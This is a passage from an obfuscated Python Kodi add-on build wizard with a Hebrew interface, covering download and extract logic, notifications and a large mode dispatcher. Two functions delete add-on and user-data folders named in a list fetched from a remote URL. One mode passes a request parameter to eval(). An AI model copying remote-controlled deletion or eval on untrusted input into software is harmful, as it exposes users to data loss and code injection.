              O0OO00O00O00O0O00 =False #line:6465
        if O0OO00O00O00O0O00 :#line:6467
              OOOOO0O0O000OO0OO =int (OOOOO0O0O000OO0OO )#line:6468
        OO0OOOOOOOOO0OOOO =0 #line:6470
        O0000OO0000O00OOO =time .time ()#line:6471
        while True :#line:6472
              OO0OO0000O00OO00O =OOOOO00O0O00O00OO .read (8192 )#line:6473
              if not OO0OO0000O00OO00O :#line:6474
                  sys .stdout .write ('\n')#line:6475
                  break #line:6476
              OO0OOOOOOOOO0OOOO +=len (OO0OO0000O00OO00O )#line:6478
              OOO000O00O0000000 .write (OO0OO0000O00OO00O )#line:6479
              if not O0OO00O00O00O0O00 :#line:6481
                  OOOOO0O0O000OO0OO =OO0OOOOOOOOO0OOOO #line:6482
              if O0OOO0000O0O0OOO0 .iscanceled ():#line:6483
                 O0OOO0000O0O0OOO0 .close ()#line:6484
                 try :#line:6485
                  os .remove (O000OO0OO0OO000O0 )#line:6486
                 except :#line:6487
                  pass #line:6488
                 break #line:6489
              O000000000O0000OO =float (OO0OOOOOOOOO0OOOO )/OOOOO0O0O000OO0OO #line:6490
              O000000000O0000OO =round (O000000000O0000OO *100 ,2 )#line:6491
              O00O0OOOO00OOO000 =OO0OOOOOOOOO0OOOO /(1024 *1024 )#line:6492
              OO000OOO000OOOOO0 =OOOOO0O0O000OO0OO /(1024 *1024 )#line:6493
              O0OO0OOO0000000O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0OOOO00OOO000 ,'teal',OO000OOO000OOOOO0 )#line:6494
              if (time .time ()-O0000OO0000O00OOO )>0 :#line:6495
                OOO0OO0O00OO00OOO =OO0OOOOOOOOO0OOOO /(time .time ()-O0000OO0000O00OOO )#line:6496
                OOO0OO0O00OO00OOO =OOO0OO0O00OO00OOO /1024 #line:6497
              else :#line:6498
               OOO0OO0O00OO00OOO =0 #line:6499
              O000OOOO0OO00O0OO ='KB'#line:6500
              if OOO0OO0O00OO00OOO >=1024 :#line:6501
                 OOO0OO0O00OO00OOO =OOO0OO0O00OO00OOO /1024 #line:6502
                 O000OOOO0OO00O0OO ='MB'#line:6503
              if OOO0OO0O00OO00OOO >0 and not O000000000O0000OO ==100 :#line:6504
                  OO000O0OO0OOOOO0O =(OOOOO0O0O000OO0OO -OO0OOOOOOOOO0OOOO )/OOO0OO0O00OO00OOO #line:6505
              else :#line:6506
                  OO000O0OO0OOOOO0O =0 #line:6507
              O00O0O0O00OOO0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OO0O00OO00OOO ,O000OOOO0OO00O0OO )#line:6508
              O0OOO0000O0O0OOO0 .update (int (O000000000O0000OO ),O0OO0OOO0000000O0 ,O00O0O0O00OOO0O0O +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6510
        O0OO0O0O0OOO00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6513
        OOO000O00O0000000 .close ()#line:6516
        extract .all (O000OO0OO0OO000O0 ,O0OO0O0O0OOO00OOO ,O0OOO0000O0O0OOO0 )#line:6517
        try :#line:6521
          os .remove (O000OO0OO0OO000O0 )#line:6522
        except :#line:6523
          pass #line:6524
def testnotify ():#line:6527
	O00OO0O0OO0OO0O0O =wiz .workingURL (NOTIFICATION )#line:6528
	if O00OO0O0OO0OO0O0O ==True :#line:6529
		try :#line:6530
			OO0OO0OO0O0OO0OOO ,O000000OO00O00OO0 =wiz .splitNotify (NOTIFICATION )#line:6531
			if OO0OO0OO0O0OO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6532
			if STARTP2 ()=='ok':#line:6533
				notify .notification (O000000OO00O00OO0 ,True )#line:6534
		except Exception as OO00OO000OOO0O00O :#line:6535
			wiz .log ("Error on Notifications Window: %s"%str (OO00OO000OOO0O00O ),xbmc .LOGERROR )#line:6536
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6537
def testnotify2 ():#line:6538
	O00O0000O0000OOO0 =wiz .workingURL (NOTIFICATION2 )#line:6539
	if O00O0000O0000OOO0 ==True :#line:6540
		try :#line:6541
			O0O0O0000OOOO0OOO ,OOOO0O0O0O0O0OOO0 =wiz .splitNotify (NOTIFICATION2 )#line:6542
			if O0O0O0000OOOO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6543
			if STARTP2 ()=='ok':#line:6544
				notify .notification2 (OOOO0O0O0O0O0OOO0 ,True )#line:6545
		except Exception as OOO000OO00OOOO0OO :#line:6546
			wiz .log ("Error on Notifications Window: %s"%str (OOO000OO00OOOO0OO ),xbmc .LOGERROR )#line:6547
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6548
def testnotify3 ():#line:6549
	O0OOO0O0O0OO000O0 =wiz .workingURL (NOTIFICATION3 )#line:6550
	if O0OOO0O0O0OO000O0 ==True :#line:6551
		try :#line:6552
			OOO00O00O00OOO000 ,O00000O0OO0000OOO =wiz .splitNotify (NOTIFICATION3 )#line:6553
			if OOO00O00O00OOO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6554
			if STARTP2 ()=='ok':#line:6555
				notify .notification3 (O00000O0OO0000OOO ,True )#line:6556
		except Exception as O0OO00O0O00O0OO0O :#line:6557
			wiz .log ("Error on Notifications Window: %s"%str (O0OO00O0O00O0OO0O ),xbmc .LOGERROR )#line:6558
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6559
def wait ():#line:6560
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6561
def infobuild ():#line:6562
	OO00OOOO0O00O0000 =wiz .workingURL (NOTIFICATION )#line:6563
	if OO00OOOO0O00O0000 ==True :#line:6564
		try :#line:6565
			OO00O0O00OO0OO0OO ,OO0O0OO0OO000000O =wiz .splitNotify (NOTIFICATION )#line:6566
			if OO00O0O00OO0OO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6567
			if STARTP2 ()=='ok':#line:6568
				notify .updateinfo (OO0O0OO0OO000000O ,True )#line:6569
		except Exception as O000OOO00O0OOOOOO :#line:6570
			wiz .log ("Error on Notifications Window: %s"%str (O000OOO00O0OOOOOO ),xbmc .LOGERROR )#line:6571
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6572
def servicemanual ():#line:6573
	OO00OOOOO0OOOO0O0 =wiz .workingURL (HELPINFO )#line:6574
	if OO00OOOOO0OOOO0O0 ==True :#line:6575
		try :#line:6576
			O00O000O00O000OO0 ,O0O0O0000OO0O0O0O =wiz .splitNotify (HELPINFO )#line:6577
			if O00O000O00O000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6578
			notify .helpinfo (O0O0O0000OO0O0O0O ,True )#line:6579
		except Exception as OO00O0000000O0000 :#line:6580
			wiz .log ("Error on Notifications Window: %s"%str (OO00O0000000O0000 ),xbmc .LOGERROR )#line:6581
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6582
def testupdate ():#line:6584
	if BUILDNAME =="":#line:6585
		notify .updateWindow ()#line:6586
	else :#line:6587
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6588
def testfirst ():#line:6590
	notify .firstRun ()#line:6591
def testfirstRun ():#line:6593
	notify .firstRunSettings ()#line:6594
def fastinstall ():#line:6597
	notify .firstRuninstall ()#line:6598
def addDir (OOO0OOOO0O000000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6605
	OO0O000OOO00000O0 =sys .argv [0 ]#line:6606
	if not mode ==None :OO0O000OOO00000O0 +="?mode=%s"%urllib .quote_plus (mode )#line:6607
	if not name ==None :OO0O000OOO00000O0 +="&name="+urllib .quote_plus (name )#line:6608
	if not url ==None :OO0O000OOO00000O0 +="&url="+urllib .quote_plus (url )#line:6609
	O00O00OOOO00O0OOO =True #line:6610
	if themeit :OOO0OOOO0O000000O =themeit %OOO0OOOO0O000000O #line:6611
	OOOOOOOO0OO0OOO0O =xbmcgui .ListItem (OOO0OOOO0O000000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6612
	OOOOOOOO0OO0OOO0O .setInfo (type ="Video",infoLabels ={"Title":OOO0OOOO0O000000O ,"Plot":description })#line:6613
	OOOOOOOO0OO0OOO0O .setProperty ("Fanart_Image",fanart )#line:6614
	if not menu ==None :OOOOOOOO0OO0OOO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6615
	O00O00OOOO00O0OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O000OOO00000O0 ,listitem =OOOOOOOO0OO0OOO0O ,isFolder =True )#line:6616
	return O00O00OOOO00O0OOO #line:6617
def addFile (OOOO0O00O0OOO0000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6619
	O00O0O0O0O0OO0000 =sys .argv [0 ]#line:6620
	if not mode ==None :O00O0O0O0O0OO0000 +="?mode=%s"%urllib .quote_plus (mode )#line:6621
	if not name ==None :O00O0O0O0O0OO0000 +="&name="+urllib .quote_plus (name )#line:6622
	if not url ==None :O00O0O0O0O0OO0000 +="&url="+urllib .quote_plus (url )#line:6623
	OO0000O0OOO000OOO =True #line:6624
	if themeit :OOOO0O00O0OOO0000 =themeit %OOOO0O00O0OOO0000 #line:6625
	OOOOO00O00OO00O0O =xbmcgui .ListItem (OOOO0O00O0OOO0000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6626
	OOOOO00O00OO00O0O .setInfo (type ="Video",infoLabels ={"Title":OOOO0O00O0OOO0000 ,"Plot":description })#line:6627
	OOOOO00O00OO00O0O .setProperty ("Fanart_Image",fanart )#line:6628
	if not menu ==None :OOOOO00O00OO00O0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6629
	OO0000O0OOO000OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O0O0O0O0OO0000 ,listitem =OOOOO00O00OO00O0O ,isFolder =False )#line:6630
	return OO0000O0OOO000OOO #line:6631
def get_params ():#line:6633
	OOO0O0O0000O0O000 =[]#line:6634
	O0OOOOO00O0O0OO00 =sys .argv [2 ]#line:6635
	if len (O0OOOOO00O0O0OO00 )>=2 :#line:6636
		OOO00000OO0OO0O00 =sys .argv [2 ]#line:6637
		OO00O0O0O0O0O00OO =OOO00000OO0OO0O00 .replace ('?','')#line:6638
		if (OOO00000OO0OO0O00 [len (OOO00000OO0OO0O00 )-1 ]=='/'):#line:6639
			OOO00000OO0OO0O00 =OOO00000OO0OO0O00 [0 :len (OOO00000OO0OO0O00 )-2 ]#line:6640
		OO0OOO00OOO0O000O =OO00O0O0O0O0O00OO .split ('&')#line:6641
		OOO0O0O0000O0O000 ={}#line:6642
		for OO0O0000OO0000000 in range (len (OO0OOO00OOO0O000O )):#line:6643
			O0OO0OO0O0000000O ={}#line:6644
			O0OO0OO0O0000000O =OO0OOO00OOO0O000O [OO0O0000OO0000000 ].split ('=')#line:6645
			if (len (O0OO0OO0O0000000O ))==2 :#line:6646
				OOO0O0O0000O0O000 [O0OO0OO0O0000000O [0 ]]=O0OO0OO0O0000000O [1 ]#line:6647
		return OOO0O0O0000O0O000 #line:6649
def remove_addons ():#line:6651
	try :#line:6652
			import json #line:6653
			O0O0O0O0OO000OO0O =urllib2 .urlopen (remove_url ).readlines ()#line:6654
			for O0O0000OO00OO00OO in O0O0O0O0OO000OO0O :#line:6655
				O00OOOOOO00OO000O =O0O0000OO00OO00OO .split (':')[1 ].strip ()#line:6657
				O0OO000O00OO0O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00OOOOOO00OO000O ,'false')#line:6658
				OO00O000000000O00 =xbmc .executeJSONRPC (O0OO000O00OO0O0O0 )#line:6659
				O00O0OO00OO00O0OO =json .loads (OO00O000000000O00 )#line:6660
				O0OOO00O00O0O0OO0 =os .path .join (addons_folder ,O00OOOOOO00OO000O )#line:6662
				if os .path .exists (O0OOO00O00O0O0OO0 ):#line:6664
					for O0OO0O0OOO00O0O0O ,OO00OO0OO00OOO0O0 ,O000000000O00OO00 in os .walk (O0OOO00O00O0O0OO0 ):#line:6665
						for OOOOO0000OO0O00OO in O000000000O00OO00 :#line:6666
							os .unlink (os .path .join (O0OO0O0OOO00O0O0O ,OOOOO0000OO0O00OO ))#line:6667
						for OO000OO0OO0OO0OO0 in OO00OO0OO00OOO0O0 :#line:6668
							shutil .rmtree (os .path .join (O0OO0O0OOO00O0O0O ,OO000OO0OO0OO0OO0 ))#line:6669
					os .rmdir (O0OOO00O00O0O0OO0 )#line:6670
			xbmc .executebuiltin ('Container.Refresh')#line:6672
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6673
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6674
	except :pass #line:6675
def remove_addons2 ():#line:6676
	try :#line:6677
			import json #line:6678
			OO00000OOO0O0OOO0 =urllib2 .urlopen (remove_url2 ).readlines ()#line:6679
			for O00O00OO00OO000OO in OO00000OOO0O0OOO0 :#line:6680
				OOOOOOO000OOOO00O =O00O00OO00OO000OO .split (':')[1 ].strip ()#line:6682
				O00OO0O00O000O00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOOOOO000OOOO00O ,'false')#line:6683
				O0OOOO0OOOO00O000 =xbmc .executeJSONRPC (O00OO0O00O000O00O )#line:6684
				O00OOO000O0000OOO =json .loads (O0OOOO0OOOO00O000 )#line:6685
				OO00O0O0000OOOO0O =os .path .join (user_folder ,OOOOOOO000OOOO00O )#line:6687
				if os .path .exists (OO00O0O0000OOOO0O ):#line:6689
					for O0O00OO00O00O0O0O ,O000OO000OO000O0O ,O0OO0O00OO000OO00 in os .walk (OO00O0O0000OOOO0O ):#line:6690
						for O0OOOO0000O000O00 in O0OO0O00OO000OO00 :#line:6691
							os .unlink (os .path .join (O0O00OO00O00O0O0O ,O0OOOO0000O000O00 ))#line:6692
						for OO00000O0O0O00O0O in O000OO000OO000O0O :#line:6693
							shutil .rmtree (os .path .join (O0O00OO00O00O0O0O ,OO00000O0O0O00O0O ))#line:6694
					os .rmdir (OO00O0O0000OOOO0O )#line:6695
	except :pass #line:6697
params =get_params ()#line:6698
url =None #line:6699
name =None #line:6700
mode =None #line:6701
try :mode =urllib .unquote_plus (params ["mode"])#line:6703
except :pass #line:6704
try :name =urllib .unquote_plus (params ["name"])#line:6705
except :pass #line:6706
try :url =urllib .unquote_plus (params ["url"])#line:6707
except :pass #line:6708
if not os .path .exists (os .path .join (ADDONDATA ,'4.3.0')):#line:6709
        file =open (os .path .join (ADDONDATA ,'4.3.0'),'w')#line:6711
        file .write (str ('Done'))#line:6713
        file .close ()#line:6714
        xbmc .getInfoLabel ('System.OSVersionInfo')#line:6715
        xbmc .sleep (2000 )#line:6716
        label =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6717
        ADDON .setSetting ('systemtype',label )#line:6718
def setView (OOO0O0OO0OO000000 ,OOO0O0000OO00OOOO ):#line:6720
	if wiz .getS ('auto-view')=='true':#line:6721
		OO00O0OO00OO00O0O =wiz .getS (OOO0O0000OO00OOOO )#line:6722
		if OO00O0OO00OO00O0O =='50'and KODIV >=17 and SKIN =='skin.estuary':OO00O0OO00OO00O0O ='55'#line:6723
		if OO00O0OO00OO00O0O =='500'and KODIV >=17 and SKIN =='skin.estuary':OO00O0OO00OO00O0O ='50'#line:6724
		wiz .ebi ("Container.SetViewMode(%s)"%OO00O0OO00OO00O0O )#line:6725
if mode ==None :index ()#line:6727
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6729
elif mode =='builds':buildMenu ()#line:6730
elif mode =='viewbuild':viewBuild (name )#line:6731
elif mode =='buildinfo':buildInfo (name )#line:6732
elif mode =='buildpreview':buildVideo (name )#line:6733
elif mode =='install':buildWizard (name ,url )#line:6734
elif mode =='theme':buildWizard (name ,mode ,url )#line:6735
elif mode =='viewthirdparty':viewThirdList (name )#line:6736
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6737
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6738
elif mode =='maint':maintMenu (name )#line:6740
elif mode =='passpin':passandpin ()#line:6741
elif mode =='backmyupbuild':backmyupbuild ()#line:6742
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6743
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6744
elif mode =='advancedsetting':advancedWindow (name )#line:6745
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6746
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6747
elif mode =='asciicheck':wiz .asciiCheck ()#line:6748
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6749
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6750
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6751
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6752
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6753
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6754
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6755
elif mode =='currentsettings':viewAdvanced ()#line:6756
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6757
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6758
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6759
elif mode =='fixskin':backtokodi ()#line:6760
elif mode =='testcommand':testcommand ()#line:6761
elif mode =='logsend':logsend ()#line:6762
elif mode =='rdon':rdon ()#line:6763
elif mode =='rdoff':rdoff ()#line:6764
elif mode =='setrd':setrealdebrid ()#line:6765
elif mode =='setrd2':setautorealdebrid ()#line:6766
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6767
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6768
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6769
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6770
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6771
elif mode =='freshstart':freshStart ()#line:6772
elif mode =='forceupdate':wiz .forceUpdate ()#line:6773
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6774
elif mode =='forceclose':wiz .killxbmc ()#line:6775
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6776
elif mode =='hidepassword':wiz .hidePassword ()#line:6777
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6778
elif mode =='enableaddons':enableAddons ()#line:6779
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6780
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6781
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6782
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6783
elif mode =='uploadlog':uploadLog .Main ()#line:6784
elif mode =='viewlog':LogViewer ()#line:6785
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6786
elif mode =='viewerrorlog':errorChecking (all =True )#line:6787
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6788
elif mode =='purgedb':purgeDb ()#line:6789
elif mode =='fixaddonupdate':fixUpdate ()#line:6790
elif mode =='removeaddons':removeAddonMenu ()#line:6791
elif mode =='removeaddon':removeAddon (name )#line:6792
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6793
elif mode =='removedata':removeAddonData (name )#line:6794
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6795
elif mode =='systeminfo':systemInfo ()#line:6796
elif mode =='restorezip':restoreit ('build')#line:6797
elif mode =='restoregui':restoreit ('gui')#line:6798
elif mode =='restoreaddon':restoreit ('addondata')#line:6799
elif mode =='restoreextzip':restoreextit ('build')#line:6800
elif mode =='restoreextgui':restoreextit ('gui')#line:6801
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6802
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6803
elif mode =='traktsync':traktsync ()#line:6804
elif mode =='apk':apkMenu (name )#line:6806
elif mode =='apkscrape':apkScraper (name )#line:6807
elif mode =='apkinstall':apkInstaller (name ,url )#line:6808
elif mode =='speed':speedMenu ()#line:6809
elif mode =='net':net_tools ()#line:6810
elif mode =='GetList':GetList (url )#line:6811
elif mode =='youtube':youtubeMenu (name )#line:6812
elif mode =='viewVideo':playVideo (url )#line:6813
elif mode =='addons':addonMenu (name )#line:6815
elif mode =='addoninstall':addonInstaller (name ,url )#line:6816
elif mode =='savedata':saveMenu ()#line:6818
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6819
elif mode =='managedata':manageSaveData (name )#line:6820
elif mode =='whitelist':wiz .whiteList (name )#line:6821
elif mode =='trakt':traktMenu ()#line:6823
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6824
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6825
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6826
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6827
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6828
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6829
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6830
elif mode =='realdebrid':realMenu ()#line:6832
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6833
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6834
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6835
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6836
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6837
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6838
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6839
elif mode =='login':loginMenu ()#line:6841
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6842
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6843
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6844
elif mode =='clearlogin':loginit .clearSaved (name )#line:6845
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6846
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6847
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6848
elif mode =='contact':notify .contact (CONTACT )#line:6850
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6851
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6852
elif mode =='developer':developer ()#line:6854
elif mode =='converttext':wiz .convertText ()#line:6855
elif mode =='createqr':wiz .createQR ()#line:6856
elif mode =='testnotify':testnotify ()#line:6857
elif mode =='testnotify2':testnotify2 ()#line:6858
elif mode =='servicemanual':servicemanual ()#line:6859
elif mode =='fastinstall':fastinstall ()#line:6860
elif mode =='testupdate':testupdate ()#line:6861
elif mode =='testfirst':testfirst ()#line:6862
elif mode =='testfirstrun':testfirstRun ()#line:6863
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6864
elif mode =='bg':wiz .bg_install (name ,url )#line:6866
elif mode =='bgcustom':wiz .bg_custom ()#line:6867
elif mode =='bgremove':wiz .bg_remove ()#line:6868
elif mode =='bgdefault':wiz .bg_default ()#line:6869
elif mode =='rdset':rdsetup ()#line:6870
elif mode =='mor':morsetup ()#line:6871
elif mode =='mor2':morsetup2 ()#line:6872
elif mode =='resolveurl':resolveurlsetup ()#line:6873
elif mode =='urlresolver':urlresolversetup ()#line:6874
elif mode =='forcefastupdate':forcefastupdate ()#line:6875
elif mode =='traktset':traktsetup ()#line:6876
elif mode =='placentaset':placentasetup ()#line:6877
elif mode =='flixnetset':flixnetsetup ()#line:6878
elif mode =='reptiliaset':reptiliasetup ()#line:6879
elif mode =='yodasset':yodasetup ()#line:6880
elif mode =='numbersset':numberssetup ()#line:6881
elif mode =='uranusset':uranussetup ()#line:6882
elif mode =='genesisset':genesissetup ()#line:6883
elif mode =='fastupdate':fastupdate ()#line:6884
elif mode =='folderback':folderback ()#line:6885
elif mode =='menudata':Menu ()#line:6886
elif mode =='infoupdate':infobuild ()#line:6887
elif mode =='wait':wait ()#line:6888
elif mode ==2 :#line:6889
        wiz .torent_menu ()#line:6890
elif mode ==3 :#line:6891
        wiz .popcorn_menu ()#line:6892
elif mode ==8 :#line:6893
        wiz .metaliq_fix ()#line:6894
elif mode ==9 :#line:6895
        wiz .quasar_menu ()#line:6896
elif mode ==5 :#line:6897
        swapSkins ('skin.Premium.mod')#line:6898
elif mode ==13 :#line:6899
        wiz .elementum_menu ()#line:6900
elif mode ==16 :#line:6901
        wiz .fix_wizard ()#line:6902
elif mode ==17 :#line:6903
        wiz .last_play ()#line:6904
elif mode ==18 :#line:6905
        wiz .normal_metalliq ()#line:6906
elif mode ==19 :#line:6907
        wiz .fast_metalliq ()#line:6908
elif mode ==20 :#line:6909
        wiz .fix_buffer2 ()#line:6910
elif mode ==21 :#line:6911
        wiz .fix_buffer3 ()#line:6912
elif mode ==11 :#line:6913
        wiz .fix_buffer ()#line:6914
elif mode ==15 :#line:6915
        wiz .fix_font ()#line:6916
elif mode ==14 :#line:6917
        wiz .clean_pass ()#line:6918
elif mode ==22 :#line:6919
        wiz .movie_update ()#line:6920
elif mode =='simpleiptv':#line:6923
    DIALOG =xbmcgui .Dialog ()#line:6925
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6926
    if choice ==1 :#line:6927
        iptvkodi17_18 ()#line:6928
    else :#line:6930
     sys .exit ()#line:6931
elif mode =='simpleidanplus':#line:6933
    DIALOG =xbmcgui .Dialog ()#line:6934
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6935
    if choice ==1 :#line:6936
        iptvidanplus ()#line:6937
    else :#line:6939
     sys .exit ()#line:6940
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6942
elif mode =='adv_settings':buffer1 ()#line:6943
elif mode =='getpass':getpass ()#line:6944
elif mode =='setpass':setpass ()#line:6945
elif mode =='setuname':setuname ()#line:6946
elif mode =='passandUsername':passandUsername ()#line:6947
elif mode =='9':disply_hwr ()#line:6948
elif mode =='99':disply_hwr2 ()#line:6949
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))